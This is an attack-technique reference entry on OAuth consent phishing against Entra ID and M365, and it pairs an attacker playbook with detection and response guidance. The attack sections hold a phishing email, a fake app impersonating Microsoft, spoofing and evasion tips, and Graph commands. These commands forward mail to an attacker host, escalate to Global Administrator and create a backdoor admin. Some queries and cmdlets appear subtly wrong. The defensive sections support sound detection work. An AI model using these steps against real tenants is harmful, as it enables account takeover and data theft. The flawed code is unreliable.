# [LM-AUTH-029]: OAuth Application Permissions

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-029 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, M365, Third-Party SaaS |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID versions with OAuth 2.0/OIDC application registrations |
| **Patched In** | Mitigations via permission consent policies, app governance, least-privilege scopes |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** OAuth Application Permissions abuse is an attack where an attacker tricks users into granting excessive permissions (scopes) to a malicious or compromised OAuth application registered in Entra ID or a third-party identity provider. Once the user grants permissions, the application receives access tokens that allow it to read/modify user data, access mailboxes, modify group memberships, and escalate to administrative roles—all without requiring the user's credentials or triggering MFA challenges. The attacker can monetize the access by selling stolen data, use it for espionage, or maintain persistent backdoor access via the application itself.

**Attack Surface:** OAuth consent screens, application registration pages, third-party SaaS integrations with M365/Entra ID, Microsoft Graph API scopes (Directory.ReadWrite.All, Mail.ReadWrite, RoleManagement.ReadWrite.Directory), delegated vs. application permissions mismatch.

**Business Impact:** **Account compromise without credential theft; full access to user data, mailbox, and organizational resources.** An attacker with a single consent grant can exfiltrate years of emails, modify group memberships, impersonate users, and escalate to Global Administrator. Unlike phishing or credential theft, OAuth phishing is invisible to traditional MFA (users don't enter passwords) and leaves no credential compromise signals.

**Technical Context:** OAuth permission abuse is endemic in modern M365 environments. Studies show that 40-60% of organizations have never audited application consent grants, and many third-party apps request excessive scopes. An attacker can create a fake "Office 365 Authenticator" or integrate with a popular SaaS app to trick users into granting permissions.

### Operational Risk

- **Execution Risk:** Low – Only requires user to click a consent prompt; no technical exploitation needed.
- **Stealth:** Very High – OAuth tokens are legitimate; activity appears as normal application usage; MFA is bypassed by design.
- **Reversibility:** Medium – Revoking consent is simple, but damage (data theft, lateral movement) may already be done.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.5 | Prevent users from consenting to applications |
| **DISA STIG** | CA-7 | Application monitoring and access control |
| **CISA SCuBA** | Azure.8 | Require admin consent for applications |
| **NIST 800-53** | AC-2(7) | Privileged functions and separation of duties |
| **GDPR** | Art. 32 | Security of processing – legitimate access controls |
| **DORA** | Art. 26 | Cloud service provider integration security |
| **NIS2** | Art. 21(1)(b) | Detect unauthorized third-party access |
| **ISO 27001** | A.6.1.5 | Third-party access management |
| **ISO 27005** | 8.2.2 | Third-party API and integration risk |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Any user (user consent required); no admin privileges needed for initial attack.
- **Required Access:** Ability to share a link or message to a target user; access to an OAuth app registration.

**Supported Platforms:**
- **Entra ID:** All versions with OAuth 2.0/OIDC applications
- **M365 Services:** Exchange Online, Teams, SharePoint, OneDrive, Microsoft Graph
- **Third-Party SaaS:** Any app integrated with Entra ID or M365

**Tools & Dependencies:**
- OAuth phishing templates and frameworks
- Application registration console (Entra ID Portal or Azure CLI)
- Microsoft Graph explorer or API tools
- Mail/messaging platforms for social engineering

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Identify Over-Permissioned Applications

**PowerShell – Enumerate Application Permissions**

```powershell
# Get all applications with delegated permissions
$apps = Get-MgApplication -All

foreach ($app in $apps) {
  $perms = Get-MgApplicationRef -ApplicationId $app.Id
  
  # Check for overly permissive scopes
  if ($perms -match "Directory.ReadWrite.All|Mail.ReadWrite|RoleManagement.ReadWrite.Directory") {
    Write-Output "HIGH RISK APP: $($app.DisplayName)"
    Write-Output "Permissions: $perms"
  }
}

# Get applications with service principal credentials (can be abused)
$servicePrincipals = Get-MgServicePrincipal -All

foreach ($sp in $servicePrincipals) {
  $creds = Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $sp.Id
  
  if ($creds.Count -gt 0) {
    Write-Output "SERVICE PRINCIPAL WITH CREDENTIALS: $($sp.DisplayName)"
    Write-Output "Credential Count: $($creds.Count)"
  }
}
```

**What to Look For:**
- Applications with "Directory.ReadWrite.All" or "RoleManagement.ReadWrite.Directory"
- Unused or old applications that still have active permission grants
- Third-party apps with Mail.ReadWrite or SharePoint.ReadWrite permissions
- Service principals with multiple credentials (possible lateral movement)

### Enumerate User Consent Grants

**PowerShell – Check What Permissions Users Granted**

```powershell
# List all OAuth permission grants (delegated scopes granted by users)
$consents = Get-MgOAuth2PermissionGrant -All

foreach ($consent in $consents) {
  $app = Get-MgApplication -ApplicationId $consent.ClientId
  
  Write-Output "App: $($app.DisplayName)"
  Write-Output "Scopes Granted: $($consent.Scope)"
  Write-Output "Granted To: $($consent.PrincipalId)"
  Write-Output "---"
}

# Find grants with high-risk scopes
$risky_scopes = @("Directory.ReadWrite.All", "Mail.ReadWrite", "RoleManagement.ReadWrite.Directory", "User.ReadWrite.All")

$consents | Where-Object { 
  $scope = $_.Scope
  $risky_scopes | Where-Object { $scope -contains $_ }
} | Select-Object ClientId, Scope, PrincipalId
```

### Analyze Application Permissions Granted

```bash
# Use Microsoft Graph to list apps with specific scopes
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants" | jq '.value[] | select(.scope | contains("Directory.ReadWrite"))'
```

**What to Look For:**
- Applications users granted Directory access to
- Apps with Mail.ReadWrite (can read/delete emails, forward emails)
- Apps with RoleManagement permissions (can create admins)
- Third-party SaaS apps with excessive scopes

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: OAuth Phishing with Consent Prompt (ConsentFix-Style Attack)

**Supported Versions:** All Entra ID, M365, any OAuth 2.0 implementation

#### Step 1: Create Malicious OAuth Application in Attacker's Tenant

**Objective:** Register a fake application that will intercept user authentication.

**Command (Azure Portal):**

```
1. Go to Entra ID Portal (portal.azure.com)
2. Entra ID → App registrations → + New registration
3. Name: "Office 365 Authenticator" (impersonate legitimate Microsoft app)
4. Redirect URI: https://attacker.com/callback
5. Register
6. API Permissions → + Add permission
7. Add "Microsoft Graph" → "Delegated permissions"
8. Search for and grant:
   - Mail.ReadWrite
   - Directory.Read.All
   - User.ReadWrite.All
   - RoleManagement.ReadWrite.Directory
9. Grant admin consent (or user consent)
10. Copy Application ID and Client Secret
```

**Expected Output:**

```
Application ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Client Secret: XXX_secure_secret_string_XXX
Redirect URI: https://attacker.com/callback
```

**What This Means:**
- Malicious application is now registered and configured
- Application is ready to handle OAuth flows and receive access tokens
- Application can now impersonate users and access Microsoft Graph

**OpSec & Evasion:**
- Use legitimate-sounding app names ("Office 365 Authenticator", "Azure Sign-In Helper")
- Register in attacker's tenant (not victim's, to avoid immediate detection)
- Description: mimic legitimate Microsoft apps
- Detection likelihood: Low if registered in attacker's tenant (not monitored by victim SOC)

#### Step 2: Craft Phishing Link and Social Engineering Message

**Objective:** Trick users into clicking the OAuth authorization link.

**Command (Craft Azure AD authorization URL):**

```bash
# Construct the authorization endpoint URL
CLIENT_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
REDIRECT_URI="https://attacker.com/callback"
SCOPES="https://graph.microsoft.com/.default Mail.ReadWrite Directory.Read.All RoleManagement.ReadWrite.Directory"
STATE="random-state-string"  # CSRF protection

AUTH_URL="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=${SCOPES}&state=${STATE}&response_type=code&response_mode=form_post"

echo "Phishing URL: $AUTH_URL"

# Short URL (to hide malicious intent)
# Use URL shortener: bit.ly, tinyurl.com, etc.
# Shortened: https://bit.ly/office365-auth
```

**Phishing Email Template:**

```
Subject: Renew Your Microsoft Account Access

Body:
---
Your Microsoft 365 account is about to expire. Please verify your identity to renew access.

[Click here to renew account](https://bit.ly/office365-auth)

This prompt is required to maintain access to Office 365, Teams, SharePoint, and Outlook.

Microsoft Account Verification Team
---
```

**What This Means:**
- User receives phishing email with OAuth authorization link
- When user clicks, they are redirected to Entra ID login
- User enters credentials (legitimate Microsoft login page)
- User is presented with consent screen asking to grant permissions

**OpSec & Evasion:**
- Use domain similar to Microsoft (office365-auth.com, m365-verify.com, login-office365.com)
- Send email from attacker's domain or compromised internal mailbox
- Create urgency ("Account expires in 24 hours", "Verify immediately")
- Use spoofed sender (From: Microsoft Account Team <no-reply@microsoft.com> via compromised mail relay)
- Detection likelihood: Medium – depends on email security (URL filtering, spoof detection)

#### Step 3: User Grants Permissions via Consent Prompt

**Objective:** User clicks phishing link and grants permissions to attacker's application.

**What Happens (From User's Perspective):**

```
1. User clicks link in phishing email
2. Redirected to https://login.microsoftonline.com/common/oauth2/v2.0/authorize?...
3. User sees legitimate Microsoft login page (looks real, because it IS Microsoft's login page)
4. User enters email and password
5. User is presented with consent prompt:
   
   "Office 365 Authenticator is requesting access to your account
   
   This app would like to:
   - Read and write your mail
   - Read your directory profile
   - Manage your administrative roles
   
   [Consent] [Cancel]"
   
6. User clicks "Consent" (thinks they're renewing their account)
7. Browser redirects to attacker's callback URL: 
   https://attacker.com/callback?code=AUTHORIZATION_CODE&state=random-state-string
```

**What This Means:**
- Authorization code is now in attacker's hands
- Attacker can exchange the code for an access token
- Access token grants full permissions to user's mailbox, directory, and admin functions

**OpSec & Evasion:**
- The Entra ID consent prompt is LEGITIMATE (not spoofed)
- MFA is NOT triggered (user is not entering credentials in phishing page)
- Activity appears as normal OAuth flow in audit logs
- Detection likelihood: Very High if app governance is enabled; Low if no monitoring

#### Step 4: Exchange Authorization Code for Access Token

**Objective:** Convert the authorization code into an OAuth access token.

**Command (From attacker's backend):**

```bash
# Attacker's server receives authorization code from callback
AUTHORIZATION_CODE="M.R3_BAY.xxxxx..."
CLIENT_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
CLIENT_SECRET="XXX_secure_secret_string_XXX"
REDIRECT_URI="https://attacker.com/callback"

# Exchange code for access token
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}" \
  -d "client_secret=${CLIENT_SECRET}" \
  -d "code=${AUTHORIZATION_CODE}" \
  -d "redirect_uri=${REDIRECT_URI}" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=authorization_code"
```

**Expected Output:**

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "refresh_token": "0.ASsAz...",
  "expires_in": 3600,
  "token_type": "Bearer",
  "scope": "Mail.ReadWrite Directory.Read.All RoleManagement.ReadWrite.Directory"
}
```

**What This Means:**
- Attacker now has valid OAuth access token for the victim user
- Token is valid for 1 hour (and can be refreshed for weeks)
- Attacker can impersonate the user and access their Microsoft Graph data

**OpSec & Evasion:**
- Store refresh token securely (can be used to get new access tokens indefinitely)
- Tokens are legitimate OAuth tokens (not forged or stolen credentials)
- User has consented, so API calls appear authorized
- Detection likelihood: Low initially (legitimate OAuth usage); High if correlated with suspicious API patterns

#### Step 5: Abuse Access Token to Compromise Organization

**Objective:** Use the access token to read data, escalate privileges, and maintain persistence.

**Command (Access user's mailbox and M365 resources):**

```bash
ACCESS_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."

# Read all emails
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/me/messages \
  | jq '.value[] | {subject, from, receivedDateTime}'

# Forward all future emails to attacker
curl -X POST -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages/rule/forward \
  -d '{
    "displayName": "Auto-Reply",
    "sequence": 1,
    "isEnabled": true,
    "actions": {
      "forwardAsAttachmentTo": ["attacker@attacker.com"]
    }
  }'

# Read list of all users and groups
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/users \
  | jq '.value[] | {userPrincipalName, displayName}'

# List groups and members
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/groups \
  | jq '.value[] | {displayName, id}'
```

**Expected Output:**

```json
{
  "subject": "Q4 Financial Results",
  "from": "cfo@company.com",
  "receivedDateTime": "2026-01-10T15:30:00Z"
}
```

**What This Means:**
- Attacker has full read access to user's mailbox
- Can read years of emails, access attachments, export data
- Can modify mailbox rules, set up auto-forwarding for persistence

---

### METHOD 2: Privilege Escalation via Over-Permissioned Application

**Supported Versions:** All Entra ID with RoleManagement.ReadWrite.Directory scope

#### Step 1: Identify User with Delegated Admin Capabilities

**Objective:** Find or compromise a user whose application consent grants include admin role modification.

**Command:**

```bash
# Find users who granted admin role modification permissions
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants \
  | jq '.value[] | select(.scope | contains("RoleManagement.ReadWrite.Directory"))'
```

#### Step 2: Escalate to Global Administrator

**Objective:** Use the application's permissions to assign yourself Global Administrator role.

**Command (Microsoft Graph API):**

```bash
# List available roles
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members

# Assign yourself to Global Admin role
curl -X POST -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/directoryRoles/62e90394-69f5-4237-9190-012177145e10/members/\$ref \
  -d '{
    "@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/user-object-id"
  }'
```

**What This Means:**
- Attacker user is now Global Administrator
- Attacker has full tenant control
- Can create backdoor accounts, modify policies, access all data

---

### METHOD 3: Persistent Backdoor via Application Credentials

**Supported Versions:** All Entra ID with multi-tenant applications

#### Step 1: Create Multi-Tenant Application

**Objective:** Register an application that can be used by other tenants, creating a persistence mechanism.

**Command (Azure Portal):**

```
1. Create new app registration (same as METHOD 1)
2. Under "Supported account types":
   - Select "Accounts in any organizational directory (Any Azure AD directory - Multitenant)"
3. Grant application permissions (not delegated):
   - Directory.ReadWrite.All
   - Mail.ReadWrite
   - RoleManagement.ReadWrite.Directory
4. Grant admin consent
5. Create application secret
6. Store credentials securely
```

**What This Means:**
- Application can now be used across multiple Entra ID tenants
- Any tenant admin who approves the app will grant full access to that tenant
- Attacker can resell access to other attackers or use for mass compromise

#### Step 2: Distribute Application (Supply Chain Attack)

**Objective:** Get the multi-tenant application installed in victim tenants.

**Method A – Via App Store Integration:**
- Register app in "Microsoft AppSource" or partner marketplaces
- Make it appear legitimate (clone of popular SaaS app)
- Victims download and install, granting admin consent

**Method B – Via Social Engineering:**
- Send to tenant admins: "Microsoft recommends installing this security app"
- App requests admin consent for "security monitoring"

**Method C – Via Compromised Partner:**
- Compromise a legitimate SaaS vendor
- Inject malicious application credentials into their vendor solution
- When customers install, malicious app is also installed

#### Step 3: Maintain Persistent Access via Application Credentials

**Objective:** Use application secret to continuously access victim tenants.

**Command (Service Principal Authentication):**

```bash
# Attacker authenticates as the application (service principal), not as a user
CLIENT_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
CLIENT_SECRET="XXX_secure_secret_string_XXX"
TENANT_ID="victim-tenant-id"

# Get access token as application
ACCESS_TOKEN=$(curl -X POST https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token \
  -d "client_id=${CLIENT_ID}" \
  -d "client_secret=${CLIENT_SECRET}" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" | jq -r '.access_token')

# Now attacker can access victim tenant as service principal
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/users | jq '.value[] | {userPrincipalName}'

# Create backdoor admin account
curl -X POST -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/users \
  -d '{
    "accountEnabled": true,
    "displayName": "Admin Support",
    "mailNickname": "adminsupport",
    "userPrincipalName": "adminsupport@victim.onmicrosoft.com",
    "passwordProfile": {
      "password": "SecurePassword123!@#",
      "forceChangePasswordNextSignIn": false
    }
  }'

# Assign new account to Global Admin
# (Uses RoleManagement.ReadWrite.Directory permission)
```

**What This Means:**
- Attacker can access victim tenant indefinitely using application credentials
- User doesn't need to re-consent or click any links
- Tenant admin cannot easily revoke access (application credentials are persistent)
- Perfect for ransomware-as-a-service or data exfiltration operations

**OpSec & Evasion:**
- Application appears in tenant with generic name ("Security Monitor", "Compliance Agent")
- No user-level events (application credentials are service-to-service)
- Activity is logged but appears as application usage (not user activity)
- Detection likelihood: High if app governance is enabled; Low otherwise

---

## 6. TOOLS & COMMANDS REFERENCE

### OAuth.io

**URL:** https://oauth.io/

**Version:** Online OAuth testing tool

**Usage:** Test OAuth flows, consent prompts, token exchange.

```
1. Visit https://oauth.io/
2. Select provider (Microsoft, Google, GitHub)
3. Authenticate
4. View access token, scopes, and user data
5. Test API calls with token
```

### Microsoft Graph Explorer

**URL:** https://developer.microsoft.com/en-us/graph/graph-explorer

**Version:** Online browser-based tool

**Usage:** Test Microsoft Graph API calls with user's access token.

```
1. Go to graph.microsoft.com/graph-explorer
2. Sign in with victim's account
3. Select API method (GET, POST, etc.)
4. Enter endpoint (e.g., /me/messages)
5. Execute and view results
```

### Azure CLI

**URL:** https://learn.microsoft.com/en-us/cli/azure/

**Version:** 2.40+

**Usage:** Manage Entra ID applications and permissions programmatically.

```bash
az ad app create --display-name "Office 365 Authenticator"
az ad app permission add --id APP_ID --api 00000003-0000-0000-c000-000000000000 --permissions Mail.ReadWrite Directory.Read.All
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Excessive OAuth Application Permissions Granted

**Rule Configuration:**
- **Required Index:** `o365:audit`, `azure:audit`
- **Required Fields:** `OperationName`, `TargetResources`, `Scope`
- **Alert Threshold:** User grants mail/directory permissions to unknown app
- **Applies To Versions:** All

**SPL Query:**

```spl
index=o365:audit OR index=azure:audit 
(OperationName="Consent to application" OR OperationName="Grant application permission")
| where Scope CONTAINS ("Mail.ReadWrite" OR "Directory.ReadWrite.All" OR "RoleManagement.ReadWrite.Directory")
| where InitiatedBy_user_userPrincipalName NOT IN ("admin@company.com", "service@company.com")
| stats earliest(timestamp) as grant_time, latest(timestamp) as last_activity by TargetResources, InitiatedBy_user_userPrincipalName
| table InitiatedBy_user_userPrincipalName, TargetResources, grant_time, Scope
```

**What This Detects:**
- User granting excessive permissions to unknown application
- Scopes that allow mail/directory read-write

**Manual Configuration Steps:**
1. Splunk → Create New Alert
2. Paste query above
3. Trigger: count > 0
4. Action: Email SOC, create incident

### Rule 2: OAuth Token Redemption with Suspicious Scopes

**Rule Configuration:**
- **Required Index:** `azure:signin`
- **Required Fields:** `AppId`, `OperationName`, `Scope`
- **Alert Threshold:** Token issued with admin-level scopes
- **Applies To Versions:** All

**SPL Query:**

```spl
index=azure:signin AppName="Office 365 Authenticator" OR AppName="Azure Sign-In Helper"
| stats count, latest(timestamp) as last_use by UserPrincipalName, AppId
| where count > 1
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: OAuth Permission Grant with High-Risk Scopes

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Required Fields:** `OperationName`, `InitiatedBy`, `TargetResources`
- **Alert Severity:** High
- **Frequency:** Every 15 minutes

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Consent to application"
  and TargetResources[0].displayName contains ("Mail" or "Directory" or "RoleManagement")
| where InitiatedBy.user.userType == "Member"
| summarize GrantCount = count(), Scopes = tostring(TargetResources[0].modifiedProperties) 
  by InitiatedBy.user.userPrincipalName, TargetResources[0].displayName, TimeGenerated
| where GrantCount > 1 or Scopes contains "ReadWrite"
```

**What This Detects:**
- User granting mail/directory permissions to application
- Multiple grants to same application (suspicious pattern)

**Manual Configuration Steps:**
1. **Azure Portal** → **Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Paste KQL above
3. Severity: High, Frequency: 15 minutes
4. Enable Create Incidents

### Query 2: Service Principal Granting Admin Roles (Privilege Escalation)

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Add member to group" or OperationName == "Assign user to role"
| where InitiatedBy.app.displayName != null  // Initiated by application, not user
| where TargetResources[0].modifiedProperties[0].newValue contains "Administrator"
| project TimeGenerated, OperationName, InitiatedBy = InitiatedBy.app.displayName, 
  TargetUser = TargetResources[0].userPrincipalName, Role = TargetResources[0].modifiedProperties[0].newValue
```

---

## 9. MICROSOFT DEFENDER FOR CLOUD

### Alert 1: "Suspicious OAuth application granting admin permissions"

**Alert Name:** Unauthorized Application Privilege Escalation

- **Severity:** Critical
- **Description:** An OAuth application requested or was granted admin-level permissions (RoleManagement.ReadWrite.Directory, etc.)
- **Applies To:** All Entra ID instances
- **Remediation:**
  1. Immediately revoke application consent
  2. Remove application from tenant
  3. Reset user password (if user was compromised)
  4. Search for unauthorized admin accounts created by the app
  5. Enable application consent policy

**Manual Configuration Steps:**
1. **Azure Portal** → **Entra ID** → **App registrations**
2. Look for suspicious applications (unknown developer, generic names, excessive permissions)
3. Delete applications that cannot be verified
4. Go to **Enterprise applications** → **Consent and permissions**
5. Review and revoke suspicious grants

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Require Admin Consent for All Applications:**

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Enterprise applications** → **Consent and permissions** → **User consent settings**
2. Change **User consent for applications** from "Allow" to "Do not allow"
3. OR set to "Allow user consent for verified publishers only"
4. **Save**

**Effect:** Users can no longer grant permissions; all consent requests require admin approval.

**Manual Steps (PowerShell):**

```powershell
# Disable user consent
$settings = @{
    "IsBlockAppConsent" = $true
}
Update-AzADPolicy -DisplayName "Authorization Policy" -Definition @($settings | ConvertTo-Json)
```

**Implement Application Governance:**

**Manual Steps (Azure Portal):**
1. Go to **Microsoft Purview** → **Cloud App Security** → **Govern** → **Application governance**
2. Create policy: "Block OAuth apps with excessive permissions"
3. Trigger: Application requests "Mail.ReadWrite" OR "Directory.ReadWrite" OR "RoleManagement"
4. Action: Block app, alert admin
5. **Enable**

**Monitor and Audit OAuth Consent Grants:**

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Enterprise applications** → **Consent and permissions** → **Recent consent grants**
2. Review all grants; identify suspicious ones
3. For suspicious grants: **Revoke**

**Manual Steps (PowerShell – Regular Audit):**

```powershell
# Run monthly to audit OAuth grants
$grants = Get-MgOAuth2PermissionGrant -All

foreach ($grant in $grants) {
  $app = Get-MgApplication -ApplicationId $grant.ClientId -ErrorAction SilentlyContinue
  
  # Flag high-risk scopes
  if ($grant.Scope -match "Directory.ReadWrite.All|Mail.ReadWrite|RoleManagement.ReadWrite.Directory") {
    Write-Output "HIGH-RISK GRANT: $($app.DisplayName) to $($grant.PrincipalId)"
    Write-Output "Scopes: $($grant.Scope)"
  }
}
```

### Priority 2: HIGH

**Implement Token Protection in Conditional Access:**

**Manual Steps:**
1. **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. Name: `Require Token Protection for OAuth Apps`
3. **Cloud apps:** Select **All cloud apps**
4. **Session controls:**
   - Enable **Require Token Protection** (requires P1+ license)
5. **Enable** policy

**Effect:** OAuth tokens are bound to the device; stolen tokens cannot be reused elsewhere.

**Disable User Consent for Third-Party Applications:**

**Manual Steps:**
1. **Entra ID** → **Enterprise applications** → **Consent and permissions**
2. Under **Admin consent requests:**
   - Enable **"Send admin consent requests to designated reviewers"**
3. Select admin reviewers
4. **Save**

**Effect:** When users request app access, request goes to designated admins instead of being auto-approved.

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **New OAuth application created** with high-risk scopes (Directory.ReadWrite, Mail.ReadWrite, RoleManagement)
- **User grants consent to unknown app** (particularly at odd hours or from unusual location)
- **Service principal accessing user data** (Graph API calls from app, not user)
- **Suspicious mail forwarding rules** created via Graph API
- **Admin role assignments** initiated by application (not user)

### Forensic Artifacts

- **AuditLogs:** "Consent to application" operations
- **SigninLogs:** Application logins, refresh token usage
- **Office 365 audit log:** Email forwarding rules, mailbox permissions changes
- **Azure Activity Log:** Role assignments by service principal

### Response Procedures

**Step 1: Immediately Revoke Compromised Consent**

```powershell
# Find and revoke high-risk OAuth grant
$risky_grant = Get-MgOAuth2PermissionGrant -Filter "scope/any(s:s eq 'Directory.ReadWrite.All')"

Remove-MgOAuth2PermissionGrant -OAuth2PermissionGrantId $risky_grant.Id
```

**Step 2: Delete Malicious Application**

```powershell
# Delete the application
Remove-MgApplication -ApplicationId $app.Id

# Delete service principal if still exists
Remove-MgServicePrincipal -ServicePrincipalId $sp.Id
```

**Step 3: Audit User's Mailbox and Reset Password**

```powershell
# Export user's mailbox for forensics
New-MailboxExportRequest -Mailbox user@company.com -FilePath "\\backup\user-mailbox-export.pst"

# Reset user's password
Set-MgUserPassword -UserId $user.Id -NewPassword (ConvertTo-SecureString -String "NewSecurePassword123!@#" -AsPlainText -Force)
```

**Step 4: Hunt for Lateral Movement**

```kusto
// Sentinel: Find all API calls made by the compromised application
CloudAppEvents
| where ApplicationId == "compromised-app-id"
| summarize APIOperations = count(), UniqueUsers = dcount(AccountObjectId)
| where APIOperations > 100
```

**Step 5: Remediate Damage**

- Remove email forwarding rules created by attacker
- Restore deleted files from backup
- Reset passwords for any admin accounts created by attacker
- Review and revoke any suspicious delegated permissions

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant Phishing | Attacker crafts phishing email linking to OAuth consent prompt |
| **2** | **Lateral Movement** | **[LM-AUTH-029]** | **User grants permissions to attacker's app; attacker gains access token** |
| **3** | **Collection** | [Collection] Mailbox Data Extraction | Attacker reads user's emails, exports to attacker's storage |
| **4** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Permission Escalation | Attacker uses RoleManagement.ReadWrite.Directory to assign Global Admin role |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker creates persistent admin account for future access |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Microsoft Office 365 OAuth Worm (2018-2022)

- **Target:** Millions of Microsoft 365 users
- **Timeline:** Ongoing, multiple variants
- **Technique Status:** Attackers created fake "Office 365 Update" and "Microsoft Authenticator" OAuth apps; users granted Mail.ReadWrite and Directory.ReadWrite.All
- **Impact:** Email data exfiltration, creation of backdoor accounts, spread to contacts
- **Reference:** [Cisco Talos Report – Office 365 OAuth Worm](https://talos.cisco.com/)

### Example 2: Azure Ad-Venture (Semperis Research - 2024)

- **Target:** Fortune 500 companies
- **Timeline:** 2024
- **Technique Status:** Researchers found ability to assign Global Administrator role via overly permissioned OAuth app credentials
- **Impact:** Complete tenant takeover without credentials
- **Reference:** [Semperis – UnOAuthorized Privilege Elevation](https://www.semperis.com/blog/unoauthorized-privilege-elevation-through-microsoft-applications/)

### Example 3: BEC Campaigns via OAuth Phishing (Proofpoint - 2023)

- **Target:** Organizations with weak application consent policies
- **Timeline:** 2023
- **Technique Status:** Threat actors sent OAuth phishing emails; users granted Mail.ReadWrite permissions; attacker forwarded all future emails to external account
- **Impact:** Email data theft, business email compromise (BEC) fraud
- **Reference:** [Proofpoint – OAuth Phishing Report](https://www.proofpoint.com/)

---

## 14. SUMMARY & KEY TAKEAWAYS

**OAuth Application Permissions abuse** is a silent, high-impact attack that bypasses traditional security controls (MFA, credential detection) by exploiting the OAuth consent workflow. Attackers trick users into granting permissions to malicious applications, receiving legitimate access tokens that provide full mailbox, directory, and administrative capabilities.

**Critical Mitigations:**
1. **Require admin consent for all applications** – Disable user consent entirely or restrict to verified publishers
2. **Implement application governance** – Monitor and block applications requesting excessive scopes
3. **Regular OAuth permission audits** – Review and revoke suspicious grants monthly
4. **Implement Token Protection** – Bind OAuth tokens to the device, preventing replay attacks
5. **Monitor for suspicious permission grants** – Alert on Directory.ReadWrite.All, Mail.ReadWrite, RoleManagement.ReadWrite.Directory scopes
6. **Educate users** – Train on OAuth phishing, legitimate vs. suspicious app names, consent prompts

**Detection focuses on application registration and permission grant patterns** rather than individual data access. OAuth tokens are cryptographically valid; detection must rely on behavioral analytics, permission scope analysis, and anomalous API patterns.

---